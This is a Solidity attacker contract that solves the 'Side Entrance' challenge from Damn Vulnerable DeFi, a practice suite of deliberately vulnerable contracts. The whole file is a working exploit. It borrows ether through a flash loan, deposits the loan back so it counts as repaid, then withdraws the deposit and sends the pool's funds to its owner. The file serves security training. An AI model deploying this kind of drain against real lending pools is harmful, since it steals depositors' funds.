// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "hardhat/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface IFlashLoaner {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {

    IFlashLoaner private immutable target;
    address private immutable owner;

    constructor(address _target) {
        target = IFlashLoaner(_target);
        owner = msg.sender;
    }

    function execute() external payable {
        target.deposit{value: msg.value}();
        console.log("flashloaned");
    }

    function flashLoan(uint256 amount) external {
        target.flashLoan(amount);
        target.withdraw();
    }

    receive() external payable {
        console.log("received");
        (bool ok, ) = owner.call{value: address(this).balance}("RECKT");
        require(ok,"!ok");
    }
}
